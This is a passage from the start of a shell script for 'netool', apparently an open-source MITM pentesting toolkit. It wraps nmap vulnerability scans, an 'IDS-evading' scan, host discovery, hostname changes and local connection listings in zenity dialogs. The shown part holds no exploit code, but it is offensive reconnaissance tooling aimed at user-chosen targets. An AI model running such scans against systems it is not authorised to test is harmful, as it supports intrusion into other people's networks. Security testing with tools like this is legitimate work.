#!/bin/sh
##################################################
#            [NETWORK TOOLS V4.6]                #
#  ScriptBash  to view quick info about related  #
# network connections and quick scans local host #
#       By: Pedro Ubuntu (r00t-3xp10it)          #
##########################################inicio##
#
# THIS SCRIPT WAS MADE TO WORK ON A UNIX SYSTEM
# REPORT ANY BUGS FOUND TO MY WIKI
# http://sourceforge.net/projects/netoolsh/
# C0den4me:Single_byte_XOR
# D1str0:Kali
#
########






# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 93 92 > /dev/null






# ----------------------------------
# CONFIGURATIONS OF THE SCRIPT
# ----------------------------------



#####################################################################################################
#                         Path to instalations and variaveis do script                              #
#      if you want to change the paths to frameworks look at /opensource/toolkit_config             #
#####################################################################################################
ver="4.6"                                               # toolkit current develop version           #
H0m3=`echo ~`                                           # current user HOME path                    #
confSSL="installed"                                     # instalation path to sslstrip              #
about="changelog.nt"                                    # instalation path to intro screen          #
usera=`who | cut -d' ' -f1 | sort | uniq`               # grab local PC login username              #
loca=`locate -b -n 1 "opensource" | cut -d '.' -f1`     # opensource folder install path            #
distr=`cat $H0m3/opensource/netool.sh | egrep -m 1 "D1str0" | cut -d ':' -f2` # grab netool distro  #
lo=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "SET_CHANGELOG" | cut -d '=' -f2`              #
phpins=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "PHP5_INSTALL_PATH" | cut -d '=' -f2`      #
tWd=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "TEMP_FOLDER" | cut -d '=' -f2`               #
find=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "ZENMAP_INSTALL_PATH" | cut -d '=' -f2`      #
apache=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "APACHE_INSTALL_PATH" | cut -d '=' -f2`    #
priv8=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "ROOTSECTOR_INSTALL_PATH" | cut -d '=' -f2` #
find3=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "MACCHANGER_INSTALL_PATH" | cut -d '=' -f2` #
find4=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "METASPLOIT_INSTALL_PATH" | cut -d '=' -f2` #
confE=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "ETTERCONF_INSTALL_PATH" | cut -d '=' -f2`  #
confP=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "ETTERSERV_INSTALL_PATH" | cut -d '=' -f2`  #
find2=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "ETTERCAP_INSTALL_PATH" | cut -d '=' -f2`   #
confD=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "ETTERDNS_INSTALL_PATH" | cut -d '=' -f2`   #
confW=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "DRIFTNET_INSTALL_PATH" | cut -d '=' -f2`   #
#####################################################################################################







# ----------------------------------------
# Colorise shell Script output leters
# ----------------------------------------
Colors() {
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}







# -------------------------------------------
# Check for dependencies installed
# -------------------------------------------

   # check if user is root
   if [ $(id -u) != "0" ]; then

Colors;
cat << !

    ┌┐┌┌─┐┌┬┐  ┌┬┐┌─┐┌─┐┬  ┌─┐
    │││├┤  │    │ │ ││ ││  └─┐
    ┘└┘└─┘ ┴    ┴ └─┘└─┘┴─┘└─┘$ver
!
      echo ${RedF}peterubuntu10[at]sourceforge[dot]net ${Reset};
      echo "[MITM Pentesting OpenSource toolkit]"
      sleep 1
      echo ${YellowF}[!]${RedF}:${YellowF}[Check Dependencies]: ${Reset};
      sleep 2
      echo ${BlueF}[*]${RedF}:${BlueF}[Check User]:${RedF}$USER ${Reset};
      sleep 1
      echo ${RedF}[x]:[not root]${white}:you need to be ${GreenF}[root]${white} to run this script.${Reset};
      echo ""
   sleep 1
exit

else

Colors;
cat << !

    ┌┐┌┌─┐┌┬┐  ┌┬┐┌─┐┌─┐┬  ┌─┐
    │││├┤  │    │ │ ││ ││  └─┐
    ┘└┘└─┘ ┴    ┴ └─┘└─┘┴─┘└─┘$ver
!
   echo ${RedF}peterubuntu10[at]sourceforge[dot]net ${Reset};
   echo "[MITM Pentesting OpenSource toolkit]"
   sleep 1
   echo ${YellowF}[!]${RedF}:${YellowF}[Check Dependencies]: ${Reset};
   sleep 2
   echo ${BlueF}[*]${RedF}:${BlueF}[Check User]:${GreenF}$USER ${Reset};
   sleep 1
fi




      # check if Nmap installation exists
      if [ -d $find ]; then
      Colors;
      echo ${BlueF}[*]${RedF}:${BlueF}[Nmap]:${white}installation found!${Reset};

else

   Colors;
   echo ${RedF}[x]:[warning]:this script require Nmap installed to work ${Reset};
   echo ${GreenF}[!]${RedF}:${GreenF}[please wait]: Downloading from network... ${Reset};
   sleep 3
      apt-get install nmap
      apt-get install zenmap
fi
sleep 1

   # check if ettercap installation exists
   if [ -d $find2 ]; then
   Colors;
   echo ${BlueF}[*]${RedF}:${BlueF}[Ettercap]:${white}installation found!${Reset};

else

   Colors;
   echo ${RedF}[x]:[warning]:this script required ettercap installed to work${Reset};
   echo ${GreenF}[!]${RedF}:${GreenF}[please wait]: Downloading from network... ${Reset};
   sleep 3
   sudo apt-get install ettercap-text-only ettercap-graphical

fi
sleep 1

   # check if macchanger installation exists
   if [ -e $find3 ]; then
   Colors;
   echo ${BlueF}[*]${RedF}:${BlueF}[Macchanger]:${white}instalation found!${Reset};
   sleep 2

else

   echo ""
   Colors;
   echo ${RedF}[x]:[warning]this script required Macchanger instaled to work${Reset};
   echo ${GreenF}[!]${RedF}:${GreenF}[please wait]: Downloading from network... ${Reset};
   echo ${GreenF}[!]${RedF}:${white}press ${CyanF}{CTRL+C}${white} to stop installation ${Reset};
   sleep 4

      # installing macchanger from network
      echo ""
      apt-get install macchanger macchanger-gtk
      echo ${YellowF}[+]${RedF}:${YellowF}macchanger {instaled} restarting Script...${Reset};
      sleep 3
exit
fi







# ---------------------------------------
# Test For Internet Connection
# ---------------------------------------

  # ping google
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then

    echo ${BlueF}[*]${RedF}:${BlueF}[Internet Connection]${RedF}:[ FAIL ]${Reset};
    echo ${RedF}[x]:[ WARNING ]:${YellowF}This Script Needs An Active Internet Connection${Reset};
    sleep 4
    clear

else

    echo ${BlueF}[*]${RedF}:${BlueF}[Internet Connection]${RedF}:${GreenF}[ CONNECTED! ]${Reset};
    sleep 2
fi



# ----------------------------------
# print changelog screen info
# ----------------------------------

Colors;
    if [ "$lo" = "YES" ]; then
    if [ -e ~/opensource/modules/changelog.nt ]; then
    # start Intro.nt (intro screen wellcome page)
    cd ~/opensource/modules
    cat Intro.nt | zenity --title "-:[  VERSION $ver CHANGELOG  ]:-" --text-info --width 700 --height 640 > /dev/null 2>&1
    rm -f changelog.nt
    cd ~/

else
   echo ""
fi
fi




# -----------------------------------
# changelog screen info
# -----------------------------------
sh_ABOUT () {

    cd ~/opensource/modules
    # start Intro.nt (intro screen wellcome page)
    cat Intro.nt | zenity --title "-:[  VERSION $ver CHANGELOG  ]:-" --text-info --width 700 --height 640 > /dev/null 2>&1
    # return to main menu
    cd ~/
    sh_MAIN
    clear
}








# ----------------------------------
# customize settings within netool toolkit
# ----------------------------------
sh_toolconf () {
   Colors;
   echo ${BlueF}[*]${RedF}:${BlueF}[editing]:${white}toolkit_config 'file' ${Reset};
   echo ${RedF}[x]:'in' some ocasions you will need to restart ${Reset};
   echo ${RedF}[x]:the toolkit 'for' the changes take effect. ${Reset};
   cd ~/opensource
   xterm -T "toolkit_config" -geometry 75x38 -e "nano toolkit_config"
   clear
}




# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {

        Colors;
        echo ${RedF}[x]:${YellowF} You have pressed ${RedF}[CTRL+C] ${Reset};
        echo ${RedF}[x]:${YellowF} Please Wait, cleanning ... ${Reset};
        sleep 2
        sh_clean
}






# ----------------------------------
# END OF CONFIGURATIONS
# ----------------------------------



















#################################################################################
#                              SCRIPT FUNCTIONS                                 #
#################################################################################

# -----------------------------------
# Show my local connection and services
# -----------------------------------
sh_port () {

   Colors;
   echo ${YellowF}"  _"
   echo ${YellowF}' |'  This module shows Local connections and services ${Reset};
   echo ${YellowF}' |_' Running inside our pc using {netstat} Command ${Reset};
   echo ""
      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   Colors;
   echo ${BlueF}[*]${RedF}:${GreenF}[ Active network connections ]${Reset};
   echo "" > ~/opensource/logs/Local.log
   echo ":[ MAJOR STATS ]:" >> ~/opensource/logs/Local.log
   netstat -s | grep "total packets received" | awk '{print}' >> ~/opensource/logs/Local.log
   netstat -s | grep "incoming packets discarded" | awk '{print}' >> ~/opensource/logs/Local.log
   netstat -s | grep "ICMP messages received" | awk '{print}' >> ~/opensource/logs/Local.log
   netstat -s | grep "ICMP messages send" | awk '{print}' >> ~/opensource/logs/Local.log
   netstat -s | grep "active connections openings" | awk '{print}' >> ~/opensource/logs/Local.log
   netstat -s | grep "passive connections openings" | awk '{print}' >> ~/opensource/logs/Local.log
   netstat -s | grep "connections estabished" | awk '{print}' >> ~/opensource/logs/Local.log
   netstat -s | grep "bad segments received." | awk '{print}' >> ~/opensource/logs/Local.log
   # arp scan
   echo "" >> ~/opensource/logs/Local.log
   echo ":[ ARP SCAN ]:" >> ~/opensource/logs/Local.log
   arp -vn >> ~/opensource/logs/Local.log
   # NETSTAT + LSOF
   echo "" >> ~/opensource/logs/Local.log
   echo ":[ NETSTAT ]:" >> ~/opensource/logs/Local.log
   netstat -anptuw >> ~/opensource/logs/Local.log
   echo "" >> ~/opensource/logs/Local.log
   echo ":[ LSOF ]:" >> ~/opensource/logs/Local.log
   lsof -i -P >> ~/opensource/logs/Local.log

   # display results onscreen
   cat ~/opensource/logs/Local.log | zenity --title "LOCAL NETWORK STATS" --text-info --width 730 --height 600 > /dev/null 2>&1
   clear

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}









# ----------------------------------
# Ping a target address or domain name
# ----------------------------------
sh_ping () {

   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module pings a target to discover is IP addr ${Reset};
   echo ${YellowF}' |_' Or simple to see If the target domain is alive. ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

      # ping target domain and store log under /opensource/logs folder
      target=$(zenity --title="DOMAIN OR IP ADDR" --text "example: www.linux.org\nexample: 192.168.1.68" --width 300 --entry) > /dev/null 2>&1
      echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ RUNING SCAN ] ${Reset};
      ping -c 1 $target | grep "PING" | awk '{print $1,$2,$3}' > ~/opensource/logs/Ping.log
      ping -c 3 $target | grep "packets transmitted" | awk '{print $1,$2,$3,$4,$5,$6,$7,$8}' >> ~/opensource/logs/Ping.log
      cat ~/opensource/logs/Ping.log | zenity --title "PING TARGET HOST/DOMAIN" --text-info --width 450 --height 130 > /dev/null 2>&1
      sleep 1
      sh_2menu

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}








# ----------------------------------
# Show my ip address mac address and arp cache
# ----------------------------------
sh_ip () {

   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module shows the ip-address, mac-address ${Reset};
   echo ${YellowF}' |_' Hostname and arp cache of interface:${GreenF}[ $inter ] ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then


   # store in logfile
   dft=`cat /etc/hostname`
   echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ RUNING SCANS ] ${Reset};
   echo "" > ~/opensource/logs/IPSETTINGS.log
   echo ":[ HOSTNAME ]:" >> ~/opensource/logs/IPSETTINGS.log
   echo "$dft.lan" >> ~/opensource/logs/IPSETTINGS.log
   echo "" >> ~/opensource/logs/IPSETTINGS.log
   echo ":[ IP ADDRESS ]:" >> ~/opensource/logs/IPSETTINGS.log
   ifconfig $inter | grep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1 >> ~/opensource/logs/IPSETTINGS.log
   echo "" >> ~/opensource/logs/IPSETTINGS.log
   echo ":[ MAC ADDRESS ]:" >> ~/opensource/logs/IPSETTINGS.log
   ifconfig $inter | egrep -w "HW" | awk '{print $7}' >> ~/opensource/logs/IPSETTINGS.log
   echo "" >> ~/opensource/logs/IPSETTINGS.log
   echo ":[ NET MASK ]:" >> ~/opensource/logs/IPSETTINGS.log
   ifconfig $inter | egrep -w "Masc" | awk '{print $4}' | cut -d ':' -f2 >> ~/opensource/logs/IPSETTINGS.log
   echo "" >> ~/opensource/logs/IPSETTINGS.log
   echo ":[ GATEWAY ]:" >> ~/opensource/logs/IPSETTINGS.log
   ip route | grep "static" | awk {'print $3'} >> ~/opensource/logs/IPSETTINGS.log
   echo "" >> ~/opensource/logs/IPSETTINGS.log
   echo ":[ IP RANGE ]:" >> ~/opensource/logs/IPSETTINGS.log
   ip route | grep "kernel" | awk {'print $1'} >> ~/opensource/logs/IPSETTINGS.log
   echo "" >> ~/opensource/logs/IPSETTINGS.log
   echo ":[ ARP CACHE ]:" >> ~/opensource/logs/IPSETTINGS.log
   arp -a -v | grep ".lan" | cut -d '(' -f2 | cut -d ')' -f1 >> ~/opensource/logs/IPSETTINGS.log
   echo "" >> ~/opensource/logs/IPSETTINGS.log

   # display results onscreen
   cat ~/opensource/logs/IPSETTINGS.log | zenity --title "LOCAL IP SETTINGS" --text-info --width 270 --height 400 > /dev/null 2>&1
   clear
   sleep 1
   sh_2menu

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}







# ----------------------------------
# change my hostname
# ----------------------------------
sh_hostname () {

    Colors;
    inf=`cat /etc/hostname`
    echo ${YellowF}'  _'${Reset};
    echo ${YellowF}' |'  This module will change your current Hostname ${Reset};
    echo ${YellowF}' |'  FROM [${GreenF} $inf.lan ${YellowF}] TO [${GreenF} another.lan ${YellowF}] ${Reset};
    echo ${YellowF}' |_'${RedF} LOGFILE:${white} opensource/logs/HostName.log ${Reset};
    echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

      Colors;
      #append new hostname
      new=$(zenity --title="INPUT NEW HOSTNAME" --text "example: haxor" --width 300 --entry) > /dev/null 2>&1
      echo ${BlueF}[*]${RedF}:${BlueF}[ APPEND NEW HOSTNAME ]${RedF}'->'${GreenF}[ $new ]${Reset};
      echo "$new" > /etc/hostname

        # restarting network
         echo ${BlueF}[*]${RedF}:${GreenF}[ RESTART NETWORK SERVICE ]${Reset};
         service network-manager restart > /dev/null 2>&1
         sleep 15


             # display current hostname
            iupd=`cat /etc/hostname`
            echo ":[ CURRENT HOSTNAME ]:[ $iupd.lan ]" > ~/opensource/logs/HostName.log
            echo ":[ OLD HOSTNAME ]:[ $inf.lan ]" >> ~/opensource/logs/HostName.log
            cat ~/opensource/logs/HostName.log | zenity --title "CHANGE HOSTNAME" --text-info --width 450 --heigth 150 > /dev/null 2>&1
            sh_2menu

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
   sh_2menu
fi
}








# ----------------------------------
# Search for live hosts in the local network
# ----------------------------------
sh_range () {

   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |' This module scans Local lan For Live Hosts. ${Reset};
   echo ${YellowF}' |_' using nmap flag -sn [no port discovery] ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

       # grab ip range
       IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`
       IP=`ifconfig $inter | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`
       PORT=$(zenity --title="PORTS TO SEARCH" --text "example: 80,139,445 OR 1-1000" --width 300 --entry) > /dev/null 2>&1
       echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ RUNING SCAN ] ${Reset};
       nmap -sn $IP_RANGE -p $PORT -oN $H0m3/opensource/logs/Locallan.log | zenity --progress --pulsate --title "SCANNING LOCAL NETWORK" --text="INTERFACE: $inter\nIP ADDRESS: $IP\nIP RANGE: $IP_RANGE" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
       cat $H0m3/opensource/logs/Locallan.log | zenity --title "LOCAL LAN SCAN" --text-info --width 480 --height 500 > /dev/null 2>&1
       chown $usera $H0m3/opensource/logs/Locallan.log > /dev/null 2>&1
       rm $H0m3/opensource/logs/rep.log > /dev/null 2>&1
   sleep 1
   sh_dsjy # store scans in database?

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}


sh_dsjy () {
Colors;

   # store scans in database?
   dbt=$(zenity --list --title "T00LKIT DATABASE" --text "Store recent scan on t00lkit database?" --radiolist --column "Pick" --column "Option" TRUE "Append scan to DataBase" FALSE "Clear Database and Append scan" FALSE "Clear Database and manually input" --width 330 --height 220) > /dev/null 2>&1


     if [ "$dbt" = "Append scan to DataBase" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/Locallan.log`
       echo "" >> $H0m3/opensource/modules/database.db
       echo "" >> $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Scan Appended to DataBase" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and Append scan" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/Locallan.log`
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean and\nnew scan Appended" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and manually input" ]; then
       dtr=`date`
       mad=$(zenity --title="INPUT TARGET TO DATABASE" --text "You can input TARGET-IP, NOTES , ETC..." --entry --width 300) > /dev/null 2>&1
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean with\nnew Append" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}








# ----------------------------------
# Scan List of ip address targets
# ----------------------------------
sh_nlist () {

   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module scans a list of targets stored inside ${Reset};
   echo ${YellowF}' |'  [${GreenF} opensource/files/list.txt ] ${YellowF}just input the${Reset};
   echo ${YellowF}' |'  targets to scan one-per-line inside list.txt 'file'${Reset};
   echo ${YellowF}' |_'${RedF} LOGFILE:${white} opensource/logs/ListReport.log ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

     Colors;
     # scanning list of IP addresses
     PORT=$(zenity --title="PORTS TO SEARCH" --text "example: 80,139,445 OR 1-1000" --width 300 --entry) > /dev/null 2>&1
     echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ RUNING SCAN ] ${Reset};
     nmap -sS -Pn -O -iL $H0m3/opensource/files/list.txt -p $PORT --script vuln --open --reason -oN ~/opensource/logs/ListReport.log | zenity --progress --pulsate --title "SCANING LIST OF TARGETS" --text="INPUTFILE: list.txt\nLOGFILE: ListReport.log" --width 300 --percentage=0 --auto-close > /dev/null 2>&1
     cat ~/opensource/logs/ListReport.log | zenity --title "LIST OF TARGETS REPORT" --text-info --width 700 --height 500 > /dev/null 2>&1
     sleep 1
     sh_2menu

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}










# -----------------------------------
# Scan remote hosts for open ports and vulns
# -----------------------------------
sh_Smoke () {

   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module scans a target using Nmap script engine [nse]${Reset};
   echo ${YellowF}' |'  pre-defined --script vuln, We can scan open ports In 2 ways ${Reset};
   echo ${YellowF}' |'  [${GreenF} 80,135,445 ${YellowF}] OR [${GreenF} 1-1000 ${YellowF}] ${Reset};
   echo ${YellowF}' |_'${RedF} LOGFILE:${white} opensource/logs/AGressive.log ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   ipscan=$(zenity --title="TARGET IP ADDR" --text "example: 192.168.1.69" --width 300 --entry) > /dev/null 2>&1
   PORT=$(zenity --title="PORTS TO SEARCH" --text "example: 80,139,445 OR 1-1000" --width 300 --entry) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ RUNING SCANS ] ${Reset};
   echo "" > $H0m3/opensource/logs/Agressive.log
   nmap -sS -O -p $PORT --open --reason --script vuln -oN $H0m3/opensource/logs/Agressive.log $ipscan | zenity --progress --pulsate --title "NMAP AGRESSIVE SCAN" --text="LOGFILE: AGressive.log\nTARGET: $ipscan PORT: $PORT" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   cat $H0m3/opensource/logs/Agressive.log | zenity --title "AGRESSIVE SCAN REPORT" --text-info --width 700 --height 500 > /dev/null 2>&1
   chown $usera $H0m3/opensource/logs/Agressive.log > /dev/null 2>&1
   sleep 1
   sh_flls

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}


sh_flls () {
Colors;

   # store scans in database?
   dbt=$(zenity --list --title "T00LKIT DATABASE" --text "Store recent scan on t00lkit database?" --radiolist --column "Pick" --column "Option" TRUE "Append scan to DataBase" FALSE "Clear Database and Append scan" FALSE "Clear Database and manually input" --width 330 --height 230) > /dev/null 2>&1


     if [ "$dbt" = "Append scan to DataBase" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/Agressive.log`
       echo "" >> $H0m3/opensource/modules/database.db
       echo "" >> $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Scan Appended to DataBase" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and Append scan" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/Agressive.log`
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean and\nnew scan Appended" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and manually input" ]; then
       dtr=`date`
       mad=$(zenity --title="INPUT TARGET TO DATABASE" --text "You can input TARGET-IP, NOTES , ETC..." --entry --width 300) > /dev/null 2>&1
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean with\nnew Append" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}











# -----------------------------------
# Scan evading IDS 
# -----------------------------------
sh_stealth () {

   Colors;
   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module scans a target evading IDS detection${Reset};
   echo ${YellowF}' |'  We can scan ports In 2 ways [${GreenF} 80,135,445 ${YellowF}] OR [${GreenF} 1-1000 ${YellowF}]${Reset};
   echo ${YellowF}' |_'${RedF} LOGFILE:${white} opensource/logs/stealth.log ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   ipscan=$(zenity --title="TARGET IP ADDR" --text "example: 192.168.1.69" --width 300 --entry) > /dev/null 2>&1
   PORT=$(zenity --title="PORTS TO SEARCH" --text "example: 80,139,445 OR 1-1000" --width 300 --entry) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ RUNING SCANS ] ${Reset};
   echo "" > $H0m3/opensource/logs/stealth.log
   nmap -sT -Pn -p $PORT --open --reason -oN $H0m3/opensource/logs/stealth.log $ipscan | zenity --progress --pulsate --title "NMAP STEALTH SCAN (IDS)" --text="LOGFILE: stealth.log\nTARGET: $ipscan PORT: $PORT" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   cat $H0m3/opensource/logs/stealth.log | zenity --title "STEALTH SCAN (IDS)" --text-info --width 700 --height 500 > /dev/null 2>&1
   chown $usera $H0m3/opensource/logs/stealth.log > /dev/null 2>&1
   sleep 1
   sh_flls2

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}


sh_flls2 () {
Colors;

   # store scans in database?
   dbt=$(zenity --list --title "T00LKIT DATABASE" --text "Store recent scan on t00lkit database?" --radiolist --column "Pick" --column "Option" TRUE "Append scan to DataBase" FALSE "Clear Database and Append scan" FALSE "Clear Database and manually input" --width 330 --height 220) > /dev/null 2>&1


     if [ "$dbt" = "Append scan to DataBase" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/stealth.log`
       echo "" >> $H0m3/opensource/modules/database.db
       echo "" >> $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Scan Appended to DataBase" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and Append scan" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/stealth.log`
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean and\nnew scan Appended" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and manually input" ]; then
       dtr=`date`
       mad=$(zenity --title="INPUT TARGET TO DATABASE" --text "You can input TARGET-IP, NOTES , ETC..." --entry --width 300) > /dev/null 2>&1
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean with\nnew Append" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}













# -----------------------------------
# find the geolocation of target machine
# -----------------------------------
sh_geo () {
Colors;

   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module uses Nmap to scan a target in search${Reset};
   echo ${YellowF}' |'  of is geo-location and whois db records 'more info'${Reset};
   echo ${YellowF}' |'  about NSE scripts here:${GreenF}[ http://nmap.org/nsedoc/ ] ${Reset};
   echo ${YellowF}' |_'${RedF} LOGFILE:${white} opensource/logs/geobytes.log ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   Colors;
   nmapco=$(zenity --title="DOMAIN OR IP ADDR" --text "example: www.pot.com\nexample: 192.168.1.68" --width 300 --entry) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ SCANNING GEO-LOCATION ] ${Reset};
   nmap -sn --script ip-geolocation-geobytes.nse,whois $nmapco -oN ~/opensource/logs/geobytes.log | zenity --progress --pulsate --title "SCANNING GEO-LOCATION" --text="TARGET: $nmapco" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   cat ~/opensource/logs/geobytes.log | zenity --title "TARGET GEO-LOCATION REPORT" --text-info --width 530 --height 300 > /dev/null 2>&1
   sleep 1
